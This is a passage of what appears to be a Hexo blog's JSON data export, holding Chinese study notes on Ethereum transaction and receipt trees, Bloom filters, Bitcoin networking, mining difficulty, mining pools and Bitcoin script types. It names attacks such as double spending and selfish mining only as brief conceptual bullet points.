href=\"#伪造别人的签名\" class=\"headerlink\" title=\"伪造别人的签名\"></a>伪造别人的签名</h4><h4 id=\"多次花币（回滚操作）\"><a href=\"#多次花币（回滚操作）\" class=\"headerlink\" title=\"多次花币（回滚操作）\"></a>多次花币（回滚操作）</h4><ul>\n<li>说明：</li>\n<li>防范：</li>\n</ul>\n<h4 id=\"故意不发布某些合法的交易\"><a href=\"#故意不发布某些合法的交易\" class=\"headerlink\" title=\"故意不发布某些合法的交易\"></a>故意不发布某些合法的交易</h4><ul>\n<li>可以在下一个区块进行发布。</li>\n</ul>\n<h4 id=\"selffish-mining\"><a href=\"#selffish-mining\" class=\"headerlink\" title=\"selffish mining\"></a>selffish mining</h4><ul>\n<li>挖到区块等待发布。</li>\n<li>风险太大。</li>\n<li>51%</li>\n<li>好处：浪费别人算力、减少竞争。</li>\n</ul>\n"},{"title":"04-ETH-交易树与收据树","date":"2024-07-29T15:08:09.000Z","_content":"# 交易树(MPT)\n\n- 只组织当前区块的交易。\n- 提供默克尔证明。\n- 查询操作。\n# 收据树(MPT)\n\n- 由于\n# bloom filter\n\n- 高效查找存在性。\n- 生成摘要，查看映射函数是否存在。\n- 哈希之后映射。 \n- 可能会误报，不会不报。\n- false positive。\n- 不支持删除操作。\n- 添加计数器才可以进行参数操作，类似链接。\n- 每个交易都有一个bloom fliter。\n- 块头有一个总的Bloom filter。\n- 快速过滤。\n- ![](../pic/Pasted%20image%2020240729223126.png)\n\n\n\n# 交易驱动状态机-ETH\n\n\n# 问题\n\n## 账户状态是否可以只包含这两个账号的状态。\n\n- 不方便找到账户的信息。\n- 新建区块需要找到创世区块。\n##  \n\n# 代码\n\n## 交易树与收据树的创建\n![](../pic/Pasted%20image%2020240729225256.png)\n\n- 交易树的创建。\n- 收据树的创建。\n\n## DeriveSha\n\n![[Pasted%20image%2020240729225540.png]]\n\n\n## trie\n![](../pic/Pasted%20image%2020240729225626.png)\n\n\n# 收据树的结构\n![](../pic/Pasted%20image%2020240729225710.png)\n\n- bloom：bloom filter\n- logs：根据logs产生相应的bloom filter。\n\n## 区块头的数据结构\n![](../pic/Pasted%20image%2020240729225847.png)\n\n## create bloom函数\n![](../pic/Pasted%20image%2020240729225947.png)\n\n\n- 映射三个位置。\n\n## 查询bloom filter\n![](../pic/Pasted%20image%2020240729230334.png)\n","source":"_posts/04-ETH-交易树与收据树.md","raw":"---\ntitle: 04-ETH-交易树与收据树\ndate: 2024-07-29 23:08:09\ntags:\n  - BlockChain\n  - ETH\ncategories:\n  - BlockChain\n  - ETH\n---\n# 交易树(MPT)\n\n- 只组织当前区块的交易。\n- 提供默克尔证明。\n- 查询操作。\n# 收据树(MPT)\n\n- 由于\n# bloom filter\n\n- 高效查找存在性。\n- 生成摘要，查看映射函数是否存在。\n- 哈希之后映射。 \n- 可能会误报，不会不报。\n- false positive。\n- 不支持删除操作。\n- 添加计数器才可以进行参数操作，类似链接。\n- 每个交易都有一个bloom fliter。\n- 块头有一个总的Bloom filter。\n- 快速过滤。\n- ![](../pic/Pasted%20image%2020240729223126.png)\n\n\n\n# 交易驱动状态机-ETH\n\n\n# 问题\n\n## 账户状态是否可以只包含这两个账号的状态。\n\n- 不方便找到账户的信息。\n- 新建区块需要找到创世区块。\n##  \n\n# 代码\n\n## 交易树与收据树的创建\n![](../pic/Pasted%20image%2020240729225256.png)\n\n- 交易树的创建。\n- 收据树的创建。\n\n## DeriveSha\n\n![[Pasted%20image%2020240729225540.png]]\n\n\n## trie\n![](../pic/Pasted%20image%2020240729225626.png)\n\n\n# 收据树的结构\n![](../pic/Pasted%20image%2020240729225710.png)\n\n- bloom：bloom filter\n- logs：根据logs产生相应的bloom filter。\n\n## 区块头的数据结构\n![](../pic/Pasted%20image%2020240729225847.png)\n\n## create bloom函数\n![](../pic/Pasted%20image%2020240729225947.png)\n\n\n- 映射三个位置。\n\n## 查询bloom filter\n![](../pic/Pasted%20image%2020240729230334.png)\n","slug":"04-ETH-交易树与收据树","published":1,"updated":"2024-07-29T15:11:16.415Z","comments":1,"layout":"post","photos":[],"_id":"clz7mrmjw000f8wun2ahee70y","content":"<h1 id=\"交易树-MPT\"><a href=\"#交易树-MPT\" class=\"headerlink\" title=\"交易树(MPT)\"></a>交易树(MPT)</h1><ul>\n<li>只组织当前区块的交易。</li>\n<li>提供默克尔证明。</li>\n<li>查询操作。</li>\n</ul>\n<h1 id=\"收据树-MPT\"><a href=\"#收据树-MPT\" class=\"headerlink\" title=\"收据树(MPT)\"></a>收据树(MPT)</h1><ul>\n<li>由于</li>\n</ul>\n<h1 id=\"bloom-filter\"><a href=\"#bloom-filter\" class=\"headerlink\" title=\"bloom filter\"></a>bloom filter</h1><ul>\n<li>高效查找存在性。</li>\n<li>生成摘要，查看映射函数是否存在。</li>\n<li>哈希之后映射。 </li>\n<li>可能会误报，不会不报。</li>\n<li>false positive。</li>\n<li>不支持删除操作。</li>\n<li>添加计数器才可以进行参数操作，类似链接。</li>\n<li>每个交易都有一个bloom fliter。</li>\n<li>块头有一个总的Bloom filter。</li>\n<li>快速过滤。</li>\n<li><img src=\"/../pic/Pasted%20image%2020240729223126.png\"></li>\n</ul>\n<h1 id=\"交易驱动状态机-ETH\"><a href=\"#交易驱动状态机-ETH\" class=\"headerlink\" title=\"交易驱动状态机-ETH\"></a>交易驱动状态机-ETH</h1><h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><h2 id=\"账户状态是否可以只包含这两个账号的状态。\"><a href=\"#账户状态是否可以只包含这两个账号的状态。\" class=\"headerlink\" title=\"账户状态是否可以只包含这两个账号的状态。\"></a>账户状态是否可以只包含这两个账号的状态。</h2><ul>\n<li>不方便找到账户的信息。</li>\n<li>新建区块需要找到创世区块。</li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><h2 id=\"交易树与收据树的创建\"><a href=\"#交易树与收据树的创建\" class=\"headerlink\" title=\"交易树与收据树的创建\"></a>交易树与收据树的创建</h2><p><img src=\"/../pic/Pasted%20image%2020240729225256.png\"></p>\n<ul>\n<li>交易树的创建。</li>\n<li>收据树的创建。</li>\n</ul>\n<h2 id=\"DeriveSha\"><a href=\"#DeriveSha\" class=\"headerlink\" title=\"DeriveSha\"></a>DeriveSha</h2><p>![[Pasted%20image%2020240729225540.png]]</p>\n<h2 id=\"trie\"><a href=\"#trie\" class=\"headerlink\" title=\"trie\"></a>trie</h2><p><img src=\"/../pic/Pasted%20image%2020240729225626.png\"></p>\n<h1 id=\"收据树的结构\"><a href=\"#收据树的结构\" class=\"headerlink\" title=\"收据树的结构\"></a>收据树的结构</h1><p><img src=\"/../pic/Pasted%20image%2020240729225710.png\"></p>\n<ul>\n<li>bloom：bloom filter</li>\n<li>logs：根据logs产生相应的bloom filter。</li>\n</ul>\n<h2 id=\"区块头的数据结构\"><a href=\"#区块头的数据结构\" class=\"headerlink\" title=\"区块头的数据结构\"></a>区块头的数据结构</h2><p><img src=\"/../pic/Pasted%20image%2020240729225847.png\"></p>\n<h2 id=\"create-bloom函数\"><a href=\"#create-bloom函数\" class=\"headerlink\" title=\"create bloom函数\"></a>create bloom函数</h2><p><img src=\"/../pic/Pasted%20image%2020240729225947.png\"></p>\n<ul>\n<li>映射三个位置。</li>\n</ul>\n<h2 id=\"查询bloom-filter\"><a href=\"#查询bloom-filter\" class=\"headerlink\" title=\"查询bloom filter\"></a>查询bloom filter</h2><p><img src=\"/../pic/Pasted%20image%2020240729230334.png\"></p>\n","excerpt":"","more":"<h1 id=\"交易树-MPT\"><a href=\"#交易树-MPT\" class=\"headerlink\" title=\"交易树(MPT)\"></a>交易树(MPT)</h1><ul>\n<li>只组织当前区块的交易。</li>\n<li>提供默克尔证明。</li>\n<li>查询操作。</li>\n</ul>\n<h1 id=\"收据树-MPT\"><a href=\"#收据树-MPT\" class=\"headerlink\" title=\"收据树(MPT)\"></a>收据树(MPT)</h1><ul>\n<li>由于</li>\n</ul>\n<h1 id=\"bloom-filter\"><a href=\"#bloom-filter\" class=\"headerlink\" title=\"bloom filter\"></a>bloom filter</h1><ul>\n<li>高效查找存在性。</li>\n<li>生成摘要，查看映射函数是否存在。</li>\n<li>哈希之后映射。 </li>\n<li>可能会误报，不会不报。</li>\n<li>false positive。</li>\n<li>不支持删除操作。</li>\n<li>添加计数器才可以进行参数操作，类似链接。</li>\n<li>每个交易都有一个bloom fliter。</li>\n<li>块头有一个总的Bloom filter。</li>\n<li>快速过滤。</li>\n<li><img src=\"/../pic/Pasted%20image%2020240729223126.png\"></li>\n</ul>\n<h1 id=\"交易驱动状态机-ETH\"><a href=\"#交易驱动状态机-ETH\" class=\"headerlink\" title=\"交易驱动状态机-ETH\"></a>交易驱动状态机-ETH</h1><h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><h2 id=\"账户状态是否可以只包含这两个账号的状态。\"><a href=\"#账户状态是否可以只包含这两个账号的状态。\" class=\"headerlink\" title=\"账户状态是否可以只包含这两个账号的状态。\"></a>账户状态是否可以只包含这两个账号的状态。</h2><ul>\n<li>不方便找到账户的信息。</li>\n<li>新建区块需要找到创世区块。</li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><h2 id=\"交易树与收据树的创建\"><a href=\"#交易树与收据树的创建\" class=\"headerlink\" title=\"交易树与收据树的创建\"></a>交易树与收据树的创建</h2><p><img src=\"/../pic/Pasted%20image%2020240729225256.png\"></p>\n<ul>\n<li>交易树的创建。</li>\n<li>收据树的创建。</li>\n</ul>\n<h2 id=\"DeriveSha\"><a href=\"#DeriveSha\" class=\"headerlink\" title=\"DeriveSha\"></a>DeriveSha</h2><p>![[Pasted%20image%2020240729225540.png]]</p>\n<h2 id=\"trie\"><a href=\"#trie\" class=\"headerlink\" title=\"trie\"></a>trie</h2><p><img src=\"/../pic/Pasted%20image%2020240729225626.png\"></p>\n<h1 id=\"收据树的结构\"><a href=\"#收据树的结构\" class=\"headerlink\" title=\"收据树的结构\"></a>收据树的结构</h1><p><img src=\"/../pic/Pasted%20image%2020240729225710.png\"></p>\n<ul>\n<li>bloom：bloom filter</li>\n<li>logs：根据logs产生相应的bloom filter。</li>\n</ul>\n<h2 id=\"区块头的数据结构\"><a href=\"#区块头的数据结构\" class=\"headerlink\" title=\"区块头的数据结构\"></a>区块头的数据结构</h2><p><img src=\"/../pic/Pasted%20image%2020240729225847.png\"></p>\n<h2 id=\"create-bloom函数\"><a href=\"#create-bloom函数\" class=\"headerlink\" title=\"create bloom函数\"></a>create bloom函数</h2><p><img src=\"/../pic/Pasted%20image%2020240729225947.png\"></p>\n<ul>\n<li>映射三个位置。</li>\n</ul>\n<h2 id=\"查询bloom-filter\"><a href=\"#查询bloom-filter\" class=\"headerlink\" title=\"查询bloom filter\"></a>查询bloom filter</h2><p><img src=\"/../pic/Pasted%20image%2020240729230334.png\"></p>\n"},{"title":"05 BTC-网络","date":"2024-07-22T12:20:45.000Z","_content":"### 层次\n\n- 应用层：BitCoin\n- 网络层：P2P网络\n\n#### 加入节点\n\n- 需要与一个种子节点进行通信。\n\n#### 设计原则\n\n- 简单\n- 鲁棒\n\n邻居节点选取：随机选取。\n\n#### 交易集合\n\n- 存储待上链的交易集合。\n- 交易上链之后需要删除。\n- 合法交易上链之后，也把非法交易删除，前提是花费的同一个比特币。\n- 最终只保留一个指定比特币交易。\n\n#### 广播交易\n\n- best effort\n\n#### 交易问题\n\n- 线上交易都无法解决线下交易。\n- 回滚一般就是通过第二个交易进行的。\n","source":"_posts/05 BTC-网络.md","raw":"---\ntitle: 05 BTC-网络\ndate: 2024-07-22 20:20:45\ntags: \n - BTC\n - BlockChain\ncategories:\n - BlockChain\n - BTC\n---\n### 层次\n\n- 应用层：BitCoin\n- 网络层：P2P网络\n\n#### 加入节点\n\n- 需要与一个种子节点进行通信。\n\n#### 设计原则\n\n- 简单\n- 鲁棒\n\n邻居节点选取：随机选取。\n\n#### 交易集合\n\n- 存储待上链的交易集合。\n- 交易上链之后需要删除。\n- 合法交易上链之后，也把非法交易删除，前提是花费的同一个比特币。\n- 最终只保留一个指定比特币交易。\n\n#### 广播交易\n\n- best effort\n\n#### 交易问题\n\n- 线上交易都无法解决线下交易。\n- 回滚一般就是通过第二个交易进行的。\n","slug":"05 BTC-网络","published":1,"updated":"2024-07-28T06:53:53.431Z","comments":1,"layout":"post","photos":[],"_id":"clz7mrmjx000h8wun6pkp6d1c","content":"<h3 id=\"层次\"><a href=\"#层次\" class=\"headerlink\" title=\"层次\"></a>层次</h3><ul>\n<li>应用层：BitCoin</li>\n<li>网络层：P2P网络</li>\n</ul>\n<h4 id=\"加入节点\"><a href=\"#加入节点\" class=\"headerlink\" title=\"加入节点\"></a>加入节点</h4><ul>\n<li>需要与一个种子节点进行通信。</li>\n</ul>\n<h4 id=\"设计原则\"><a href=\"#设计原则\" class=\"headerlink\" title=\"设计原则\"></a>设计原则</h4><ul>\n<li>简单</li>\n<li>鲁棒</li>\n</ul>\n<p>邻居节点选取：随机选取。</p>\n<h4 id=\"交易集合\"><a href=\"#交易集合\" class=\"headerlink\" title=\"交易集合\"></a>交易集合</h4><ul>\n<li>存储待上链的交易集合。</li>\n<li>交易上链之后需要删除。</li>\n<li>合法交易上链之后，也把非法交易删除，前提是花费的同一个比特币。</li>\n<li>最终只保留一个指定比特币交易。</li>\n</ul>\n<h4 id=\"广播交易\"><a href=\"#广播交易\" class=\"headerlink\" title=\"广播交易\"></a>广播交易</h4><ul>\n<li>best effort</li>\n</ul>\n<h4 id=\"交易问题\"><a href=\"#交易问题\" class=\"headerlink\" title=\"交易问题\"></a>交易问题</h4><ul>\n<li>线上交易都无法解决线下交易。</li>\n<li>回滚一般就是通过第二个交易进行的。</li>\n</ul>\n","excerpt":"","more":"<h3 id=\"层次\"><a href=\"#层次\" class=\"headerlink\" title=\"层次\"></a>层次</h3><ul>\n<li>应用层：BitCoin</li>\n<li>网络层：P2P网络</li>\n</ul>\n<h4 id=\"加入节点\"><a href=\"#加入节点\" class=\"headerlink\" title=\"加入节点\"></a>加入节点</h4><ul>\n<li>需要与一个种子节点进行通信。</li>\n</ul>\n<h4 id=\"设计原则\"><a href=\"#设计原则\" class=\"headerlink\" title=\"设计原则\"></a>设计原则</h4><ul>\n<li>简单</li>\n<li>鲁棒</li>\n</ul>\n<p>邻居节点选取：随机选取。</p>\n<h4 id=\"交易集合\"><a href=\"#交易集合\" class=\"headerlink\" title=\"交易集合\"></a>交易集合</h4><ul>\n<li>存储待上链的交易集合。</li>\n<li>交易上链之后需要删除。</li>\n<li>合法交易上链之后，也把非法交易删除，前提是花费的同一个比特币。</li>\n<li>最终只保留一个指定比特币交易。</li>\n</ul>\n<h4 id=\"广播交易\"><a href=\"#广播交易\" class=\"headerlink\" title=\"广播交易\"></a>广播交易</h4><ul>\n<li>best effort</li>\n</ul>\n<h4 id=\"交易问题\"><a href=\"#交易问题\" class=\"headerlink\" title=\"交易问题\"></a>交易问题</h4><ul>\n<li>线上交易都无法解决线下交易。</li>\n<li>回滚一般就是通过第二个交易进行的。</li>\n</ul>\n"},{"title":"06 BTC-挖矿难度","date":"2024-07-22T12:20:46.000Z","_content":"### 调整挖矿难度\n\n- H(block header) <= target\n- 算法SHA-256\n- 挖矿难度与目标阈值成反比。\n- ![](../pic/Pasted%20image%2020240718175143.png)\n\n\n#### 出块时间太短\n\n- 容易出现分叉。\n- \n\n### 调整挖矿难度\n- 2016个块调整一次。\n- target = target * actual time/expected time\n- 上下限最多不会超过四倍，4或者1/4\n- 实际时间越短，说明算力越强，需要上调难度。\n- 实际时间越长，说明算力弱，需要下调难度。\n\n#### 所有节点怎么调整\n- 开源代码进行调整。\n- 默认大部分算力是诚实的。\n- target大部分节点都是相同的\n- 设置恶意的target则不会被其他节点接受区块。\n\n#### 算力的曲线\n![](../pic/Pasted%20image%2020240718180319.png)\n\n\n#### 挖矿难度\n![](../pic/Pasted%20image%2020240718180348.png)\n\n\n\n\n#### 出块时间\n![](../pic/Pasted%20image%2020240718180439.png)\n\n","source":"_posts/06 BTC-挖矿难度.md","raw":"---\ntitle: 06 BTC-挖矿难度\ndate: 2024-07-22 20:20:46\ntags: \n - BTC\n - BlockChain\ncategories:\n - BlockChain\n - BTC\n---\n### 调整挖矿难度\n\n- H(block header) <= target\n- 算法SHA-256\n- 挖矿难度与目标阈值成反比。\n- ![](../pic/Pasted%20image%2020240718175143.png)\n\n\n#### 出块时间太短\n\n- 容易出现分叉。\n- \n\n### 调整挖矿难度\n- 2016个块调整一次。\n- target = target * actual time/expected time\n- 上下限最多不会超过四倍，4或者1/4\n- 实际时间越短，说明算力越强，需要上调难度。\n- 实际时间越长，说明算力弱，需要下调难度。\n\n#### 所有节点怎么调整\n- 开源代码进行调整。\n- 默认大部分算力是诚实的。\n- target大部分节点都是相同的\n- 设置恶意的target则不会被其他节点接受区块。\n\n#### 算力的曲线\n![](../pic/Pasted%20image%2020240718180319.png)\n\n\n#### 挖矿难度\n![](../pic/Pasted%20image%2020240718180348.png)\n\n\n\n\n#### 出块时间\n![](../pic/Pasted%20image%2020240718180439.png)\n\n","slug":"06 BTC-挖矿难度","published":1,"updated":"2024-07-30T16:01:32.353Z","_id":"clz7mrmjy000l8wung6bifeqa","comments":1,"layout":"post","photos":[],"content":"<h3 id=\"调整挖矿难度\"><a href=\"#调整挖矿难度\" class=\"headerlink\" title=\"调整挖矿难度\"></a>调整挖矿难度</h3><ul>\n<li>H(block header) &lt;&#x3D; target</li>\n<li>算法SHA-256</li>\n<li>挖矿难度与目标阈值成反比。</li>\n<li><img src=\"/../pic/Pasted%20image%2020240718175143.png\"></li>\n</ul>\n<h4 id=\"出块时间太短\"><a href=\"#出块时间太短\" class=\"headerlink\" title=\"出块时间太短\"></a>出块时间太短</h4><ul>\n<li>容易出现分叉。</li>\n<li></li>\n</ul>\n<h3 id=\"调整挖矿难度-1\"><a href=\"#调整挖矿难度-1\" class=\"headerlink\" title=\"调整挖矿难度\"></a>调整挖矿难度</h3><ul>\n<li>2016个块调整一次。</li>\n<li>target &#x3D; target * actual time&#x2F;expected time</li>\n<li>上下限最多不会超过四倍，4或者1&#x2F;4</li>\n<li>实际时间越短，说明算力越强，需要上调难度。</li>\n<li>实际时间越长，说明算力弱，需要下调难度。</li>\n</ul>\n<h4 id=\"所有节点怎么调整\"><a href=\"#所有节点怎么调整\" class=\"headerlink\" title=\"所有节点怎么调整\"></a>所有节点怎么调整</h4><ul>\n<li>开源代码进行调整。</li>\n<li>默认大部分算力是诚实的。</li>\n<li>target大部分节点都是相同的</li>\n<li>设置恶意的target则不会被其他节点接受区块。</li>\n</ul>\n<h4 id=\"算力的曲线\"><a href=\"#算力的曲线\" class=\"headerlink\" title=\"算力的曲线\"></a>算力的曲线</h4><p><img src=\"/../pic/Pasted%20image%2020240718180319.png\"></p>\n<h4 id=\"挖矿难度\"><a href=\"#挖矿难度\" class=\"headerlink\" title=\"挖矿难度\"></a>挖矿难度</h4><p><img src=\"/../pic/Pasted%20image%2020240718180348.png\"></p>\n<h4 id=\"出块时间\"><a href=\"#出块时间\" class=\"headerlink\" title=\"出块时间\"></a>出块时间</h4><p><img src=\"/../pic/Pasted%20image%2020240718180439.png\"></p>\n","excerpt":"","more":"<h3 id=\"调整挖矿难度\"><a href=\"#调整挖矿难度\" class=\"headerlink\" title=\"调整挖矿难度\"></a>调整挖矿难度</h3><ul>\n<li>H(block header) &lt;&#x3D; target</li>\n<li>算法SHA-256</li>\n<li>挖矿难度与目标阈值成反比。</li>\n<li><img src=\"/../pic/Pasted%20image%2020240718175143.png\"></li>\n</ul>\n<h4 id=\"出块时间太短\"><a href=\"#出块时间太短\" class=\"headerlink\" title=\"出块时间太短\"></a>出块时间太短</h4><ul>\n<li>容易出现分叉。</li>\n<li></li>\n</ul>\n<h3 id=\"调整挖矿难度-1\"><a href=\"#调整挖矿难度-1\" class=\"headerlink\" title=\"调整挖矿难度\"></a>调整挖矿难度</h3><ul>\n<li>2016个块调整一次。</li>\n<li>target &#x3D; target * actual time&#x2F;expected time</li>\n<li>上下限最多不会超过四倍，4或者1&#x2F;4</li>\n<li>实际时间越短，说明算力越强，需要上调难度。</li>\n<li>实际时间越长，说明算力弱，需要下调难度。</li>\n</ul>\n<h4 id=\"所有节点怎么调整\"><a href=\"#所有节点怎么调整\" class=\"headerlink\" title=\"所有节点怎么调整\"></a>所有节点怎么调整</h4><ul>\n<li>开源代码进行调整。</li>\n<li>默认大部分算力是诚实的。</li>\n<li>target大部分节点都是相同的</li>\n<li>设置恶意的target则不会被其他节点接受区块。</li>\n</ul>\n<h4 id=\"算力的曲线\"><a href=\"#算力的曲线\" class=\"headerlink\" title=\"算力的曲线\"></a>算力的曲线</h4><p><img src=\"/../pic/Pasted%20image%2020240718180319.png\"></p>\n<h4 id=\"挖矿难度\"><a href=\"#挖矿难度\" class=\"headerlink\" title=\"挖矿难度\"></a>挖矿难度</h4><p><img src=\"/../pic/Pasted%20image%2020240718180348.png\"></p>\n<h4 id=\"出块时间\"><a href=\"#出块时间\" class=\"headerlink\" title=\"出块时间\"></a>出块时间</h4><p><img src=\"/../pic/Pasted%20image%2020240718180439.png\"></p>\n"},{"title":"07 BTC-挖矿","date":"2024-07-22T12:20:47.000Z","_content":"# 1. 基本原理\n\n## 1. 基本逻辑\n\n计算H(blockheader||none)<target_num\n\n\n# 2.节点\n\n### 全节点\n![](../pic/Pasted%20image%2020240719175626.png)\n### 轻节点\n![](../pic/Pasted%20image%2020240719175705.png)\n\n- 知道满足合法的阈值的节点。\n\n\n# 3.挖矿设备\n\nCPU：通用计算。\nGPU：大规模通用并行计算。\nASIC(Application Specific Int Circuit)：专门挖矿使用的芯片。\n\n# 4.矿池\n\n- 一个矿主，全节点,负责组装区块。\n- 多个矿工，只计算HASH值。\n- 稳定收益。\n- 降低难度进行挖矿，share\n\n# 5.矿池拥有足够的算力\n\n- 可以进行分叉攻击，把链进行分开，让自己的链成为最长合法快。\n- Boycott：封锁账户，不让某个账户的交易上链或者在上链的时候就进行分叉攻击。\n\n","source":"_posts/07 BTC-挖矿.md","raw":"---\ntitle: 07 BTC-挖矿\ndate: 2024-07-22 20:20:47\ntags: \n - BTC\n - BlockChain\ncategories:\n - BlockChain\n - BTC\n---\n# 1. 基本原理\n\n## 1. 基本逻辑\n\n计算H(blockheader||none)<target_num\n\n\n# 2.节点\n\n### 全节点\n![](../pic/Pasted%20image%2020240719175626.png)\n### 轻节点\n![](../pic/Pasted%20image%2020240719175705.png)\n\n- 知道满足合法的阈值的节点。\n\n\n# 3.挖矿设备\n\nCPU：通用计算。\nGPU：大规模通用并行计算。\nASIC(Application Specific Int Circuit)：专门挖矿使用的芯片。\n\n# 4.矿池\n\n- 一个矿主，全节点,负责组装区块。\n- 多个矿工，只计算HASH值。\n- 稳定收益。\n- 降低难度进行挖矿，share\n\n# 5.矿池拥有足够的算力\n\n- 可以进行分叉攻击，把链进行分开，让自己的链成为最长合法快。\n- Boycott：封锁账户，不让某个账户的交易上链或者在上链的时候就进行分叉攻击。\n\n","slug":"07 BTC-挖矿","published":1,"updated":"2024-07-28T06:53:53.431Z","comments":1,"layout":"post","photos":[],"_id":"clz7mrmjz000n8wun0ci33yap","content":"<h1 id=\"1-基本原理\"><a href=\"#1-基本原理\" class=\"headerlink\" title=\"1. 基本原理\"></a>1. 基本原理</h1><h2 id=\"1-基本逻辑\"><a href=\"#1-基本逻辑\" class=\"headerlink\" title=\"1. 基本逻辑\"></a>1. 基本逻辑</h2><p>计算H(blockheader||none)&lt;target_num</p>\n<h1 id=\"2-节点\"><a href=\"#2-节点\" class=\"headerlink\" title=\"2.节点\"></a>2.节点</h1><h3 id=\"全节点\"><a href=\"#全节点\" class=\"headerlink\" title=\"全节点\"></a>全节点</h3><p><img src=\"/../pic/Pasted%20image%2020240719175626.png\"></p>\n<h3 id=\"轻节点\"><a href=\"#轻节点\" class=\"headerlink\" title=\"轻节点\"></a>轻节点</h3><p><img src=\"/../pic/Pasted%20image%2020240719175705.png\"></p>\n<ul>\n<li>知道满足合法的阈值的节点。</li>\n</ul>\n<h1 id=\"3-挖矿设备\"><a href=\"#3-挖矿设备\" class=\"headerlink\" title=\"3.挖矿设备\"></a>3.挖矿设备</h1><p>CPU：通用计算。<br>GPU：大规模通用并行计算。<br>ASIC(Application Specific Int Circuit)：专门挖矿使用的芯片。</p>\n<h1 id=\"4-矿池\"><a href=\"#4-矿池\" class=\"headerlink\" title=\"4.矿池\"></a>4.矿池</h1><ul>\n<li>一个矿主，全节点,负责组装区块。</li>\n<li>多个矿工，只计算HASH值。</li>\n<li>稳定收益。</li>\n<li>降低难度进行挖矿，share</li>\n</ul>\n<h1 id=\"5-矿池拥有足够的算力\"><a href=\"#5-矿池拥有足够的算力\" class=\"headerlink\" title=\"5.矿池拥有足够的算力\"></a>5.矿池拥有足够的算力</h1><ul>\n<li>可以进行分叉攻击，把链进行分开，让自己的链成为最长合法快。</li>\n<li>Boycott：封锁账户，不让某个账户的交易上链或者在上链的时候就进行分叉攻击。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"1-基本原理\"><a href=\"#1-基本原理\" class=\"headerlink\" title=\"1. 基本原理\"></a>1. 基本原理</h1><h2 id=\"1-基本逻辑\"><a href=\"#1-基本逻辑\" class=\"headerlink\" title=\"1. 基本逻辑\"></a>1. 基本逻辑</h2><p>计算H(blockheader||none)&lt;target_num</p>\n<h1 id=\"2-节点\"><a href=\"#2-节点\" class=\"headerlink\" title=\"2.节点\"></a>2.节点</h1><h3 id=\"全节点\"><a href=\"#全节点\" class=\"headerlink\" title=\"全节点\"></a>全节点</h3><p><img src=\"/../pic/Pasted%20image%2020240719175626.png\"></p>\n<h3 id=\"轻节点\"><a href=\"#轻节点\" class=\"headerlink\" title=\"轻节点\"></a>轻节点</h3><p><img src=\"/../pic/Pasted%20image%2020240719175705.png\"></p>\n<ul>\n<li>知道满足合法的阈值的节点。</li>\n</ul>\n<h1 id=\"3-挖矿设备\"><a href=\"#3-挖矿设备\" class=\"headerlink\" title=\"3.挖矿设备\"></a>3.挖矿设备</h1><p>CPU：通用计算。<br>GPU：大规模通用并行计算。<br>ASIC(Application Specific Int Circuit)：专门挖矿使用的芯片。</p>\n<h1 id=\"4-矿池\"><a href=\"#4-矿池\" class=\"headerlink\" title=\"4.矿池\"></a>4.矿池</h1><ul>\n<li>一个矿主，全节点,负责组装区块。</li>\n<li>多个矿工，只计算HASH值。</li>\n<li>稳定收益。</li>\n<li>降低难度进行挖矿，share</li>\n</ul>\n<h1 id=\"5-矿池拥有足够的算力\"><a href=\"#5-矿池拥有足够的算力\" class=\"headerlink\" title=\"5.矿池拥有足够的算力\"></a>5.矿池拥有足够的算力</h1><ul>\n<li>可以进行分叉攻击，把链进行分开，让自己的链成为最长合法快。</li>\n<li>Boycott：封锁账户，不让某个账户的交易上链或者在上链的时候就进行分叉攻击。</li>\n</ul>\n"},{"title":"08 BTC-脚本","date":"2024-07-22T12:20:48.000Z","_content":"# 1. 交易信息\n\n### a.交易结构\n![](../pic/Pasted%20image%2020240722222013.png)\n\n\n说明：\n- locktime：生效延迟时间。\n- vin：输入信息。\n- vout：输出信息。\n- blockhash：哈希值。\n- time：交易时间。\n- blocktime：区块产生时间。\n### b.交易的输入\n![](../pic/Pasted%20image%2020240722222428.png)\n\n- txid：之前交易的哈希值。\n- vout：第几个输出结果。\n- scriptSig：输入脚本。\n\n### c.交易输出\n![](../pic/Pasted%20image%2020240722222713.png)\n\n\n- reqSigs：需要多少个签名（单/多重签名）。\n- address：输出的地址。\n\n### d.交易验证\n![](../pic/Pasted%20image%2020240722223019.png)\n\n说明：\n\n\n# 2.验证模式\n\n## a.P2PK\n![](../pic/Pasted%20image%2020240722223640.png)\n\n### 脚本执行\n![](../pic/Pasted%20image%2020240722225652.png)\n- output：指的是输出结果，里面有下转账交易的目的地址与公钥地址。\n- input：为下一个交易的输入信息，sig是对于本次交易的HASH，可以通过以上一个区块的输出的公钥进行验证这个签名的正确性。\n\n## b.P2PKH\n![](../pic/Pasted%20image%2020240722224300.png)\n\n### 脚本执行\n![](../pic/Pasted%20image%2020240722225844.png)\n说明：最常用的\n- DUP：赋值栈顶元素。\n- EQ：比较是否相等。\n- CHECKSIG：用公钥检查签名是否正确。\n\n\n## c.P2SH\n![](../pic/Pasted%20image%2020240722230237.png)\n\n### 验证\n![](../pic/Pasted%20image%2020240722230403.png)\n\n\n- 根据收款账户提供的赎回脚本，进行HASH，判断与之前提供的赎回脚本的HASH是否相等，相等则为同一个人或组织，有权花费上一个交易转入的钱。\n- 执行一遍赎回脚本，验证签名是否正确。\n\n### 实现\n\n#### 总体\n![](../pic/Pasted%20image%2020240722230911.png)\n\n#### 验证一\n![](../pic/Pasted%20image%2020240722231217.png)\n\n- 进行堆栈操作判断是否符合。\n#### 验证二\n![](../pic/Pasted%20image%2020240722231356.png)\n\n说明：\n- 反序列化。\n- 产生签名。\n- 对签名进行公钥验证。\n\n### 普通多重签名：\n![](../pic/Pasted%20image%2020240722231809.png)\n\n- 最上面的红叉子，是代码问题，多弹出一个元素。\n- 相对顺序必须相同。\n- 问题-生成交易需要在输出脚本输入公钥与最少使用的签名个数。\n- 问题-签名规则不统一，容易出现分歧。\n\n### P2SH多重签名\n![](../pic/Pasted%20image%2020240722232336.png)\n\n\n- 不用消费者输入公钥与认证规则。\n- 